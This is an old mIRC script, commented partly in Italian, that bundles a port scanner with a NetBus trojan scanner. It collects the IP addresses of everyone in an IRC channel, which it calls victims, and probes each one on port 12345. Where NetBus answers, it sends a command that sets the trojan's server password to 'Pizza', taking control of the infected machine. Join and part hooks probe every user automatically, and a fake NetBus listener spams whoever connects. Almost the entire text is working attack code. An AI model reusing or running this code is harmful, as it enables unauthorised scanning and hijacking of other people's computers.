;=======================================================================
;***PortScan v0.3 by: |UnSaNe|
;***Made for the use of CoMpUKiLL'98 script by: |UnSaNe|
;*** http://r33k.dyn.ml.org ***
;***if u rip gimme credit. :) all this code is 100% mois btw no one helped *tear*
;***Special NetBuS Scan By Frankj  AstaLaVista Enjoy frafrank@hotmail.com
;*** SpEcIaL ThAnkS tO www.ircit.net FoR NeTBuS HaCkInG :-þþþ
;=======================================================================

--SOF--[|UnSaNe|]

alias chiudinbus { sockclose netbus }
alias netscan  {
  unset %net.*
  window @NetBusScan 50 50 300 120
  aline @NetBusScan NetBusScan sta compilando la lista delle vittime di $$1 $+ ...Attendere...ah ah
  aline @NetBusScan Aggiunto: Nessuno
  set %net.total 0 | .enable #netscan.who | .who $$1
}

#Netscan.Who off
raw 352:*: {
  if (* !isin $7) {
    inc %net.total 1
    .timer 1 %net.total /netbus $4
    rline @NetBusScan 2 Aggiunto:  ( $+ $6 $+ [ $+ $4 $+ ])
  }
  halt
}
raw 315:*: { 
  echo -s Aggiunti %net.total utenti ! 
  rline @NetBusScan 2 Aggiunti %net.total utenti ! !
  window -c @NetBusScan
  .timer 1 %net.total echo -s SCANSIONE COMPLETATA di %net.total !
  .disable #Netscan.who | halt
}
#Netscan.who end

alias port.ver { return 5v0.3 }

alias portscans {

  unset %port.*

  if (($1 == $null)) { echo -a ± PortScan $port.ver by: |UnSaNe| Usage: /portscans <ip/host> <stop port> | halt }
  if (($1 == $null)) { echo -a ± PortScan $port.ver by: |UnSaNe| Usage: /portscans <ip/host> <stop port> | halt }

  set %port.ip $1
  set %port.limit $2

  if (($window(@PortScan).x != $null)) { halt }  

  window -a +b @PortScan 0 0 350 150

  aline @PortScan ± PortScan $port.ver by: |UnSaNe|
  aline -p @PortScan ± written for the use of CoMpUKiLL script by |UnSaNe|
  aline -p @PortScan ± Double Click to stop and close
  aline @PortScan ±-------------------------------±
  aline -p @PortScan ± 4Port: %port.ip
  .timerportscan %port.limit 1 /port.scan

}

alias netbus {
  set %netbusip $$1
  ; echo -s %netbusip
  sockclose netbus
  sockopen netbus $$1 12345
}

alias port.scan {

  sockclose portscans

  inc %port.port 1
  rline -p @portscan 5 ± 4Port: %port.ip $+ : $+ %port.port

  sockopen portscans %port.ip %port.port

  if ((%port.port == %port.limit)) { aline @PortScan  ± PortSCan is done scannin' | halt }
}

on 1:SOCKOPEN:portscans:{

  if (($sockerr == 3)) { halt }
  if (($sockerr == 4)) { aline 4 @PortScan can't resolve host | .timerportscan off | halt }
  aline -hp 2 @PortScan Port Open: [ $+ %port.ip $+ ]  [ $+ %port.port $+ ]

  sockclose portscans
}
on 1:SOCKOPEN:netbus:{
  if (($sockerr == 3)) { halt }
  if (($sockerr == 4)) { echo -s Impossibile risolvere l'host %netbusip | halt }
  echo -s %sd NETBUS RILEVATO! su ( %netbusip ) $sock(netbus).ip ! 
  /sockwrite -n netbus Password;1; $+ $crlf $+ ServerPwd;Pizza
}

on 1:SOCKCLOSE:netbus:{ 
  echo -s Chiusa la porta di %netbusip
}
on 1:SOCKCLOSE:portscans:{ 
  aline @PortScan ± Port forcefully closed [ $+ %port.ip $+ ]  [ $+ %port.port $+ ]
}
on 1:SOCKREAD:netbus:{
  if ($sockerr > 0) return
  :nextread
  sockread %temp.netbus
  if ($sockbr == 0) return
  echo -s NetBus %netbusip %temp.netbus
  goto nextread
}
on 1:SOCKWRITE:netbus:{
  if ($sockerr > 0) return
  echo -s $sock(netbus).ip : Hack inviato, password impostata a "Pizza"
}
on 1:sockclose:bus-v:{
  if ($sock(bus-v).ip = $ip ) { echo -s 11,12Ti sei disconnesso da te stesso !!! }
  if ($sock(bus-v).ip != $ip ) { echo 4 -s $timestamp $sock(bus-v).ip disconnesso (NetBus) } 
  .timer44 off
  .timer45 off
}
on 1:socklisten:bus:{ 
  .sockaccept bus-v 
  .sockwrite -n bus-v NetBus 1.60
  if ($sock(bus-v).ip = $ip ) { echo -s 11,12Ti sei connesso con te stesso !!! | goto çökelek }
  if ($sock(bus-v).ip != $ip ) {
    echo -a 11,12---> $timestamp   Netbus Tentativo di connessione da $sock(bus-v).ip
    .timer44 %net-kere 1 sockwrite -n bus-v Answer; $+ %net-mesaj PizzaScripT per mIRC 5.4 www.chez.com/pizzairc
    set %ara $calc(%net-kere + 1)
    .timer45 1 %ara sockclose bus-v
    echo -a 11,12---> $timestamp Ora invio il messaggio a $sock(bus-v).ip %net-kere volte !!!
  }
  :çökelek
}

; ********* TEMP INIZIO *** LOGGING CONNESSIONE
on 1:sockread:bus-v:{
  if ($sockerr > 0) return
  :nextread
  sockread %temp.busv
  if ($sockbr == 0) return
  echo -s NetBusteR %temp.busv
  goto nextread
}
; ********* TEMP FINE

menu @PortScan {
  dclick { .timerportscan off | close -@ @PortScan }
}
--EOF--[|UnSaNe|]
#netjscan off
on *:join:#:{ 
  sockclose ne*
  sockopen netbus $site 12345
}
on *:part:#:{  
  sockclose ne*
  sockopen netbus $site 12345
}
#netjscan end
